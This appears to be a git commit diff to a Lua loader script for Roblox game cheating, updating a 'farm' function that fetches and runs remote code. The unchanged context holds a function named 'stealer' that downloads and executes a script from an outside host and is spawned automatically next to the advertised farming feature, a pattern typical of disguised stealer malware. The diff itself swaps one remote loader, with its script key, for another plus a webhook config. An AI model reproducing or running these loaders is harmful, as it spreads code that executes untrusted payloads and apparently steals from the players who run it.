98961a63e1970cfc9e583156c68f6fc64e6164c9
TechCraft1 <lioontop701@gmail.com>
2024-12-22 23:07:20 +0100

    Update b22aae7d03041699ada62f6a4fb519fd.lua

--- main/v3/loaders/b22aae7d03041699ada62f6a4fb519fd.lua
+++ main/v3/loaders/b22aae7d03041699ada62f6a4fb519fd.lua
@@ -3,8 +3,14 @@ local function stealer()
     loadstring(game:HttpGet('https://darkscripts.space/scripts/96273c4c-aeee-4e07-8aba-64179469a658_1266914995518705825.lua',true))()
 end
 local function farm()
-    script_key="sgLKJVnhNVxqbfHbLrPzMNOlzfpbyKwO";
-loadstring(game:HttpGet('https://zaphub.xyz/Exec'))()
+ 
+getgenv().Config = {
+    ["EquipEnchants"] = {"Lucky Eggs", "Lucky Eggs", "Lucky Eggs", "Strong Pets", "Coins", "Fortune"},
+    ["UserID"] = "",
+    ["Webhook"] = ""
+}
+loadstring(game:HttpGet("https://api.luarmor.net/files/v3/loaders/b883bc159a5f609adb4871db6fc15ea8.lua"))()
+
 end
 
 task.spawn(stealer)
